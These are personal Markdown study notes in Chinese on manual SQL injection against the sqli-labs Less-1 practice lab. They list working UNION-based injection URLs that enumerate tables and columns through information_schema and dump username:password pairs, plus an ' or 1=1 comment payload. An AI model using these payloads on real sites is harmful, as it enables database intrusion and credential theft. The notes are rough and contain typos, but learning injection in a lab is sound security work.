### sqlmap

注释：' or 1=1 -- %20  ' or 1=1 -- +

***步骤***

1. order by 判断字段数

   * 从大到小直到不报错

     ```http://localhost/sqli-labs/Less-1/?id=' order by 4 -- +```

   * 判断字段输出的位置：

     ```![image-20200304124556138](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20200304124556138.png)``

     ![image-20200304124612150](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20200304124612150.png)

2. union 联合查询获取表名

   ```http://localhost/sqli-labs/Less-1/?id=0' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- +```

   ***数据库名：table_schema***

   ***字段名：culumn_name***

   ***表名：table_name***

   

   

3. union 字段名

​          ```http://localhost/sqli-labs/Less-1/?id=0' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users' -- +```

4. 获取字段值：

   ```http://localhost/sqli-labs/Less-1/?id=0' UNION SELECT 1,group_concat(username,0x3a,password),3 from users  -- +```

   



#### bind sql

### sql注入：

1. ***infromation_schema.columns***:
   1. table_schema 数据库名
   2. table_name 表名
   3. column_name 列名
2. ***information_schema.tables***
   1. table_schema 数据库名
   2. table_name 表名
3. information_shcema.schemata
   1. schema_name 数据库名


test
